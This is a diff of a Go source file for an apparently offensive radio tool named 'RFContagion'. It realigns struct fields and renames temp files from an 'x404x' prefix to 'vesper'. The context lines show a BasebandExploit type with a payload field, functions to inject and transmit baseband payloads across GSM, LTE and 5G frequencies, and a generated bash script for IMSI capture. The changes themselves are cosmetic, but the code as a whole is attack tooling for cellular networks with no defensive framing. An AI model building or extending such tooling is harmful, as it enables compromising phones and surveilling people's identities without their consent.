@@ -27,26 +27,26 @@ type ModemInfo struct {
 }
 
 type BasebandExploit struct {
-	Name        string
-	Target      string
-	Frequency   float64
-	Modulation  string
-	Payload     []byte
-	Chipset     string
+	Name       string
+	Target     string
+	Frequency  float64
+	Modulation string
+	Payload    []byte
+	Chipset    string
 }
 
 func NewRFContagion(cfg interface{}) *RFContagion {
 	return &RFContagion{
 		config: cfg,
 		frequencies: map[string]float64{
-			"GSM_900":   890.2e6,
-			"GSM_1800":  1710.2e6,
-			"LTE_B1":    2110.0e6,
-			"LTE_B3":    1805.0e6,
-			"LTE_B7":    2620.0e6,
-			"LTE_B20":   791.0e6,
-			"NR_n78":    3500.0e6,
-			"NR_n41":    2500.0e6,
+			"GSM_900":  890.2e6,
+			"GSM_1800": 1710.2e6,
+			"LTE_B1":   2110.0e6,
+			"LTE_B3":   1805.0e6,
+			"LTE_B7":   2620.0e6,
+			"LTE_B20":  791.0e6,
+			"NR_n78":   3500.0e6,
+			"NR_n41":   2500.0e6,
 		},
 	}
 }
@@ -94,7 +94,7 @@ func (r *RFContagion) ScanFrequencyBand(startFreq, endFreq float64, step float64
 	if strings.Contains(r.devicePath, "rtlsdr") {
 		cmd := exec.Command("rtl_power",
 			"-f", fmt.Sprintf("%.0f:%.0f:%.0f", startFreq/1e6, endFreq/1e6, step/1e6),
-			"-g", "30", "-e", "5", "/tmp/x404x_rtl.csv")
+			"-g", "30", "-e", "5", "/tmp/vesper_rtl.csv")
 		cmd.Run()
 	}
 
@@ -183,7 +183,7 @@ func (r *RFContagion) InjectBasebandPayload(chipset string, payload []byte) erro
 }
 
 func (r *RFContagion) transmitBaseband(exploit BasebandExploit) error {
-	tmpFile := fmt.Sprintf("/tmp/x404x_baseband_%d.iq", os.Getpid())
+	tmpFile := fmt.Sprintf("/tmp/vesper_baseband_%d.iq", os.Getpid())
 	f, err := os.Create(tmpFile)
 	if err != nil {
 		return err
@@ -225,7 +225,7 @@ kill %% 2>/dev/null
 echo "IMSI capture complete"
 `, int(monitorDuration.Seconds()), int(monitorDuration.Seconds()))
 
-		tmpScript := fmt.Sprintf("/tmp/x404x_imsi_cap_%d.sh", os.Getpid())
+		tmpScript := fmt.Sprintf("/tmp/vesper_imsi_cap_%d.sh", os.Getpid())
 		os.WriteFile(tmpScript, []byte(grgsmScript), 0755)
 		exec.Command("bash", tmpScript).Run()
 		os.Remove(tmpScript)
